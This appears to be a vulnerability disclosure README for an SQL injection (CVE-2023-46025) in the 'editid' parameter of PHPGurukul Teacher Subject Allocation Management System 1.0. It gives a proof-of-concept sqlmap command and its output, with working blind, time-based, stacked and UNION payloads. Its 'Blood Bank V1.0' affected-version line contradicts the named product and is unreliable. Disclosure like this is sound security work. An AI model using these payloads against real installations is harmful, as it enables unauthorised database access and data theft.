# CVE-2023-46025-PHPGurukul-Teacher-Subject-Allocation-Management-System-1.0-SQL-Injection-Vulnerability
+ Exploit Author: ersinerenler
# Vendor Homepage
+ https://phpgurukul.com/teacher-subject-allocation-system-using-php-and-mysql
# Software Link
+ https://phpgurukul.com/?sdm_process_download=1&download_id=17645
# Overview
+ PHPGurukul Teacher Subject Allocation Management System V1.0 is susceptible to a significant security vulnerability that arises from insufficient protection on the 'editid' parameter in the teacher-info.php file. This flaw can potentially be exploited to inject malicious SQL queries, leading to unauthorized access and extraction of sensitive information from the database.
# Vulnerability Details
+ CVE ID: CVE-2023-46025
+ Affected Version: Blood Bank V1.0
+ Vulnerable File: /teacher-info.php
+ Parameter Name: editid
+ Attack Type: Local
# Description
+ The lack of proper input validation and sanitization on the 'editid' parameter allows an attacker to craft SQL injection queries, bypassing authentication mechanisms and gaining unauthorized access to the database

<img width="1113" alt="image" src="https://github.com/ersinerenler/phpgurukul-Teacher-Subject-Allocation-Management-System-1.0/assets/113091631/d39fb82f-9181-4799-9265-c67d7278b77d">

# Proof of Concept (PoC) :
+ Login the admin panel
+ From the menu --> APPS --> Manage Teacher --> Edit Details
+ Click Update and intercept the request via Burp Suite
+ Copy and paste the request to the a request.txt file
+ Then use sqlmap to exploit
+ `sqlmap -r request.txt -p editid --risk 3 --level 3 --dbms mysql --batch --current-db`

```
---
Parameter: editid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: editid=1 AND 8698=8698

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: editid=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: editid=1 AND (SELECT 7238 FROM (SELECT(SLEEP(5)))KkuY)

    Type: UNION query
    Title: Generic UNION query (NULL) - 17 columns
    Payload: editid=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178626a71,0x5150594d7a46467872445173586e6a79485352684865574e6274416278436d715a64566b4a597574,0x716a767071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---

```
+ current database: `tsasdb`
<img width="1447" alt="image" src="https://github.com/ersinerenler/phpgurukul-Teacher-Subject-Allocation-Management-System-1.0/assets/113091631/c12891b3-ad2b-4404-b32d-cd2836738003">
